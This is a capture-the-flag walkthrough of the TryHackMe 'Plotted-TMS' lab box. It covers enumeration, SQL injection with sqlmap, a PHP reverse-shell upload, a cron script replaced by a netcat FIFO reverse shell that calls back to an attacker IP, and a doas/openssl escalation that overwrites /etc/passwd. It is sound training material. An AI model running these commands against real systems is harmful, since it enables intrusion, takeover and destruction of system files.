---
description: https://tryhackme.com/room/plottedtms
---

# Plotted-TMS

## Nmap

```
nmap 10.10.225.219 -p- -sS -sV

PORT    STATE    SERVICE VERSION
22/tcp  open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
53/tcp  filtered domain
80/tcp  open     http    Apache httpd 2.4.41 ((Ubuntu))
445/tcp open     http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Starting out on port 80 we find the Apache2 default page.

![](<../../../.gitbook/assets/image (11) (1) (2).png>)

Directory enumeration with `feroxbuster` produces a few interesting results.

![](<../../../.gitbook/assets/image (179).png>)

Both passwd and shadow pages have the same `base64` encoded value.

![](<../../../.gitbook/assets/image (185).png>)

After decoding...

```
echo 'bm90IHRoaXMgZWFzeSA6RA==' | base64 -d
# Returns ...                                                                                                       
not this easy :D    
```

We also find `id_rsa` under the /admin directory. This again, contains a `base64` encoded string that is not of any use...

After thoroughly going through port 80 we can then move onto port 445. Port 445 is normally reversed for SMB, however on this system it is dedicated to HTTP.

Again, the root page points back to the Apache default page.

![](<../../../.gitbook/assets/image (347).png>)

```
feroxbuster -u http://10.10.136.15:445 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -s 200 
```

![](<../../../.gitbook/assets/image (1545).png>)

Browsing to the management directory brings us to the page shown below.

![](<../../../.gitbook/assets/image (723).png>)

Before attempting any login attempts on the target system we perform further directory enumeration and find some interesting results.

![](<../../../.gitbook/assets/image (2037).png>)

![](<../../../.gitbook/assets/image (218).png>)

Downloading the `db.sql` files we find some account hashes within the file.

![](<../../../.gitbook/assets/image (107).png>)

We can then crack both hashes with `Hashcat` against the `rockyou.txt` word list.

```
hashcat -m 0 hash /usr/share/wordlists/rockyou.txt
```

However, we are unable to proceed with our cracked credentials.

![](<../../../.gitbook/assets/image (145).png>)

Inspecting the responses through ZAP web proxy we find a SQL statement error has been shown on logon failure.

![](<../../../.gitbook/assets/image (369).png>)

Saving the original request file we can then utilize `sqlmap` to see if the target is vulnerable to SQL injection.

Enumerating available information with `sqlmap` I was able to build the command below.

```
sqlmap -r ~/Desktop/request.raw --batch --tables -D tms_db -T users --columns username,password --dump
```

Whilst the hashes are the same we do have some new information. We have a username of _puser_ for the credentials we cracked earlier.

![](<../../../.gitbook/assets/image (512).png>)

Testing the credentials against the login page proves successful.

![](<../../../.gitbook/assets/image (187).png>)

Looking at the account settings in the top right of the screen we see we can change our profile picture. As we know PHP is running on the target web server we can upload a reverse shell.

RevShells was then used to generate a PHP PentestMonkey reverse shell.

**RevShells:** [https://www.revshells.com/](https://www.revshells.com/)

Next, set up a `netcat` listener then open the user profile image in a new tab to execute the PHP shell.

![](<../../../.gitbook/assets/image (1572).png>)

Which should result in a shell.

![](<../../../.gitbook/assets/image (1309).png>)

We now have access as _www-data_ and can begin to enumerate the internal system.

![](<../../../.gitbook/assets/image (183).png>)

After going through some of the PHP files we find `initialize.php` contains sensitive information.

![](<../../../.gitbook/assets/image (368).png>)

Logging into `Mysql` with the credentials from `initialize.php` we are unable to pull any new information that we did not know already.

Further enumeration with `linpeas.sh` shows the script below is executed every minute by the user _plot\_admin_.

![](<../../../.gitbook/assets/image (363).png>)

Following the command below we can replace backup.sh with our own which will contain a `netcat` reverse shell.

```bash
# rename backup.sh
mv backup.sh backup_copy.sh

# Create our own backup.sh
touch backup.sh

# Echo in first line to define bash
echo '#!/bin/bash' > backup.sh

# echo in a nc reverse shell
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.18.28.192 4444 >/tmp/f' >> backup.sh

# Change permissions to make it executable
chmod 777 backup.sh
```

A short wait later we receive a reverse shell on our attacking system.

![](<../../../.gitbook/assets/image (408).png>)

Enumerating with `linpeas.sh` shows the `doas` binary is on the system which, essentially acts as an alternative to `sudo`.

![](<../../../.gitbook/assets/image (1068).png>)

GTFOBins provides relevant information on how to abuse the `openssl` binary.

**GTFOBins:** [https://gtfobins.github.io/gtfobins/openssl/#sudo](https://gtfobins.github.io/gtfobins/openssl/#sudo)

![](<../../../.gitbook/assets/image (220).png>)

We could quite easily grab the root flag using the method below:

```
doas -u root openssl enc -in /root/root.txt
```

A more destructive method; we can echo a new root user into `/etc/passwd`. This will wipe the contents of `/etc/passwd`, however we will have a root shell.

```
// echo 'viper:$1$luDZJMtq$4ljcR6cSb41FraIUQIiQx/:0:0:viper:/home/viper:/bin/bash' | doas -u root openssl enc -out "/etc/passwd"
```

then `su` to switch user and enter the password `Password123`.

![](<../../../.gitbook/assets/image (143).png>)

![](<../../../.gitbook/assets/image (1) (1) (1) (2) (1).png>)
